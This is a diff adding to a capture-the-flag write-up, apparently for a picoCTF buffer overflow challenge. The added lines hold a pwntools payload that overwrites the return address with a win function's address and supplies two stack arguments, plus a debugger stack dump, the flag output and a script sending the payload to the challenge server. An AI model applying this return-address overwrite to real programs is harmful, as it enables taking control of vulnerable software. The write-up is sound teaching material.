@@ -300,3 +300,42 @@ void win(unsigned int arg1, unsigned int arg2) {
 
 We want to overwrite arg1 and arg2. 64-bit programs take function paramaters from registers, <br>
 but for 32-bit they're just read off the stack. 
+
+Editing the payload:
+
+```python
+payload = b"A"*112 + p32(0x08049296) + b'AAAA' + p32(0xCAFEF00D) + p32(0xF00DF00D)
+```
+
+We can see we've changed the first 2 stack variables:
+
+```
+00:0000│ esp 0xffffd5f4 ◂— 0xcafef00d
+01:0004│     0xffffd5f8 ◂— 0xf00df00d
+02:0008│     0xffffd5fc ◂— 0x300
+03:000c│     0xffffd600 —▸ 0xffffd620 ◂— 0x1
+04:0010│     0xffffd604 —▸ 0xf7e1fe2c (_GLOBAL_OFFSET_TABLE_) ◂— 0x21fd4c
+05:0014│     0xffffd608 ◂— 0x0
+06:0018│     0xffffd60c —▸ 0xf7c20af9 (__libc_start_call_main+121) ◂— add esp, 0x10
+07:001c│     0xffffd610 ◂— 0x0
+```
+
+Printing the flag :)
+
+```
+$ ./vuln < payload
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AA�AAAA
+testflag
+```
+
+```python
+from pwn import p32, remote
+
+payload = b"A"*112 + p32(0x08049296) + b'AAAA' + p32(0xCAFEF00D) + p32(0xF00DF00D)
+io = remote("saturn.picoctf.net", 54716)
+io.read()
+io.sendline(payload)
+io.read()
+print(io.read())
+```
